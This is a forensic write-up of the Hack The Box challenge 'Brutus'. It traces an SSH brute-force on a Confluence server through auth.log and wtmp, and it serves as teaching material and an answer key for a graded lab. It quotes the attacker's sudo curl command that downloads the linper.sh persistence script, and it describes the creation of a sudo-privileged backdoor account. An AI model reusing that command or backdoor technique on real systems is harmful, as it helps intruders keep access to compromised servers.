# WRITEUP

HTB Sherlocks: Brutus

Scenario:
- In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

# STEPS

Let's start by downloading the provided file `Brutus.zip`, and unzip it.

![image](https://github.com/user-attachments/assets/937d090f-568b-4adf-8cb7-b416dfa97e27)

Using `unzip` gives us `unsupported compression method 99`. 

Let's use the p7zip tool, which supports a wide range of compression formats.

![image](https://github.com/user-attachments/assets/7eab09ca-0346-47b8-9dbd-9a7f10a8b264)

![image](https://github.com/user-attachments/assets/4925ba0a-f2f0-4ace-b602-5d8837352cca)


# QUESTION 1 "Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?"

Let's start by investigating `auth.log`.

We can see many auth attempts for cron jobs, SSH, etc from the IP `65.2.161.68` to IP `172.31.35.28`

![image](https://github.com/user-attachments/assets/af1a38af-e8a3-423c-97b7-02ca12192dab)

# QUESTION 2 "The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?"

![image](https://github.com/user-attachments/assets/ed01a7ac-7f9b-49b6-899b-b046d34e061d)

The bruteforce was successfull on user `root`

# QUESTION 3 "Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact."

![image](https://github.com/user-attachments/assets/9b40a13d-a54a-4aae-a4d3-52a5ed070753)

We can see that the user authenticated at 06:32:44 with root. Although this is when the user authenticated, we are looking for when the user logged in, not when they authenticated.

Let's look at the wtmp artifact for more info, which records creation/destruction of terminals. 

We can use a tool like utmp.py to review wtmp binaries by doing the following:
- Create an output file called `wtmp.out` by inputting `wtmp` into the `utmp.py` tool
- `grep` any entries with the IP `65.2.161.68`

![image](https://github.com/user-attachments/assets/fd36a88d-e6f9-4323-ad4f-443ca1618324)

![image](https://github.com/user-attachments/assets/26110176-724e-4a96-aa6d-817a9c0b9642)

We can see that the root login occured at the following time: 2024/03/06 01:32:45

# QUESTION 4 "SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?"

Looking back at our `auth.log`, we see that after logging on the user was assigned a session # (37) in the line following the successful auth.

![image](https://github.com/user-attachments/assets/86bdbd52-bc43-4402-ad59-a287cb33649e)

# QUESTION 5 "The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?"

We can see the user added a new group to `/etc/group` & `/etc/gshadow` called cyberjunkie.

The user then created a new user (cyberjunkie), changed the password.

The user then added (cyberjunkie) to the group & shadow group `sudo`.

![image](https://github.com/user-attachments/assets/29d22cc8-efa2-48b3-b6c6-d5f7b38ae9ef)

![image](https://github.com/user-attachments/assets/cf7d6b54-a29d-4fbc-bb41-09de3fce6b3d)

# QUESTION 6 "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?"

We can review the MITRE ATTA&CK framework and categories on https://attack.mitre.org/

![image](https://github.com/user-attachments/assets/bb5be5dc-45bd-4537-abe1-f12e267e8dfa)

The Subtechnique is listed as "T1136.001"

# QUESTION 7 "What time did the attacker's first SSH session end according to auth.log?"

![image](https://github.com/user-attachments/assets/4ce346f6-1e5b-42b2-968b-c719e5e10661)

The session was logged out first, and then session ended at time: 2024/03/06 06:37:24

# QUESTION 8 "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"

Let's look for a login for user cyberjunkie and see what we find.

![image](https://github.com/user-attachments/assets/8925a429-b6db-4c60-8078-37a1b910b3ce)

We found a login. Now let's see what `sudo` commands they executed.

`auth.log` typically doesnt track command execution, but any commands run with `sudo` require authentication and therefore will be logged here.

![image](https://github.com/user-attachments/assets/cdc99920-00ba-4998-978a-267cd4f3d4f4)

We can see that the user downloaded a GitHub script using sudo: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

# END

https://labs.hackthebox.com/achievement/sherlock/2192113/631


